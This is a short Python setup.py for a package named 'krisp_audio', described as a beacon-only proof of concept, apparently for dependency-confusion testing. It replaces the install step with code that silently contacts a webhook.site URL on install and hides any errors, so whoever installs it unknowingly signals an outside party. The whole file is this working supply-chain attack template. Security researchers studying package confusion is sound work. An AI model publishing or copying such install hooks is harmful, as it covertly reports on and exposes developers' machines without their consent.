from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/34fa67b7-ebd0-4004-a567-87363b128bc8"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="krisp_audio",
    version="1.0.0",
    packages=["krisp_audio"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
